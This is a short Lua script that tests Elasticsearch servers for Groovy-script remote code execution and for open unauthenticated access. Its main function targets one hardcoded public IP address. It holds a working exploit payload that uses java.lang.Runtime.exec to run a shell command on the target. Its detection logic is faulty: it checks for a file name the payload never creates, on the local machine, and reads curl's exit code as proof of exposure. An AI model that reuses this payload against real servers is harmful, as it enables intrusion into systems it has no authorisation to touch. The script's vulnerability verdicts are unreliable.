#!/usr/local/bin/lua
--Author:Sevck
--Date:2016/7/4
--Function:Check ElasticSearch RCE and ElasticSearch nauthorized access .

local common=agent.require"agent.platform.linux.common"
local execute_shell=common.execute_shell
local curl = agent.require "lcurl"
agent.load "rex_pcre"
local rex = rex_pcre

function check_rce(ip,port)
	local response_html = ""
	local visitable=true
	command="touch /tmp/check_ElasticSearch"
	playload=("{\"size\":1,\"script_fields\": {\"iswin\": {\"script\":\"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"touch /tmp/qtsec\").getInputStream())).readLines()\",\"lang\": \"groovy\"}}}")
	requester = curl.easy()
	requester:setopt_followlocation(1)
	requester:setopt(curl.OPT_HEADER, true)
	requester:setopt(curl.OPT_URL,ip..":"..port.."/_search?pretty")
	requester:setopt(curl.OPT_POST, true)
	requester:setopt(curl.OPT_POSTFIELDS,playload)
	requester:setopt(curl.OPT_WRITEFUNCTION, 
    function(s) 
        response_html = response_html..s 
        return true 
    end)
	 requester:setopt(curl.OPT_TIMEOUT, 10)
    local tmp_code, tmp_msg = requester:perform()
	if requester:getinfo(curl.INFO_RESPONSE_CODE) ==200 then
		--print(response_html)
		local result=isExists("/tmp/check_ElasticSearch")
		if result then
			print("[*]"..ip..":"..port.." Exist ElasticSearch RCE!")
			return 1,"Success"
		else
			print("pass")
			return -1,"Failed"
		end
	else
		print("Request Failed.Response Code Not Equals 200")
		return -1,"Failed"
	end
end

function isExists(fileName)
    local file=io.open(fileName,"r")

    if file~=nil then 
        io.close(file) 
        return true 
    end
    return false 
end

function check_info(ip,port)
	local code,msg=execute_shell("curl -o /dev/null -s -w %{http_code} "..ip..":"..port.."/_plugin/head/")
	if code==0 then
		print("[*]"..ip..":"..port.." Exist ElasticSearch nauthorized access! ")
		return 1,"success"
	else
		return -1,"Failed"
	end
end

function main()
	local aa,bb=check_rce("194.242.114.168","9200")
	print(aa,bb)
	local cc,dd=check_info("194.242.114.168","9200")
	print(cc,dd)
end
main()
